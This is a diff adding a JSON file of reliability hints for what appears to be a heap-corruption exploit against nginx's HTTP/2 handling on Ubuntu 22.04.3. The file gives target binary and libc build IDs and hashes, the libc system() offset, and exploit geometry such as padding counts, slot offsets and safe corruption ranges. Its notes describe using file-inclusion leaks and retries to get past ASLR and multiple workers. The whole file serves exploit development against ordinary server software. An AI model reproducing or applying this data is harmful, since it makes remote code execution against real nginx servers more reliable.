@@ -1,0 +1,48 @@
+{
+  "schema": 1,
+  "purpose": "Seed knowledge base for future distro/version/layout reliability hints. These entries are observations, not exploit inputs that replace live remote derivation.",
+  "patterns": [
+    {
+      "id": "ubuntu-22.04.3-nginx-rift-http2-single-worker",
+      "status": "observed-lab-pattern",
+      "os_release": "Ubuntu 22.04.3 LTS",
+      "arch": "x86_64",
+      "nginx_path": "/nginx-src/build/nginx",
+      "nginx_build_id": "060e053ab1fa1a2876b7fe0ff4eff0cc777857b6",
+      "nginx_sha256": "14bebe8937678598b8ebb8449f8c155478a4c49894c9467ce51d54a79352f08f",
+      "libc_path": "/usr/lib/x86_64-linux-gnu/libc.so.6",
+      "libc_build_id": "095c7ba148aeca81668091f718047078d57efddb",
+      "libc_sha256": "c53819710b163d3f1d2541778590d58d3ef31cb0ed75adcbe059faac68c1e72d",
+      "system_offset": "0x50d70",
+      "nginx_config_sha256": "22026f67f6a7d025...",
+      "nginx_config_hints": {
+        "listen": "19321 http2",
+        "request_pool_size": 4096,
+        "connection_pool_size": 1456,
+        "set_prefix": "PPPPPPPPPPP"
+      },
+      "exploit_geometry": {
+        "target_len": 2,
+        "a_count": 127,
+        "plus_count": 962,
+        "slot_marker_offset": 24,
+        "slot_stride": 8
+      },
+      "observed_reset_core": {
+        "slot_total": 10437,
+        "safe_slot_range": [896, 1204],
+        "probe_corrupted_pools": 1
+      },
+      "reliability_notes": [
+        "Use live LFI-derived maps, libc hashing, and reset-core candidates first.",
+        "Treat this as a fallback hint for expected geometry and sanity ranges, not as a source of ASLR bases.",
+        "Multiple nginx workers require PID/core correlation and more retries."
+      ],
+      "todo": [
+        "Reconfirm nginx and libc build IDs across clean VM rebuilds.",
+        "Add Ubuntu 24.04 and Debian variants once separately validated.",
+        "Record candidate count distributions and first-win candidate index by platform."
+      ]
+    }
+  ]
+}
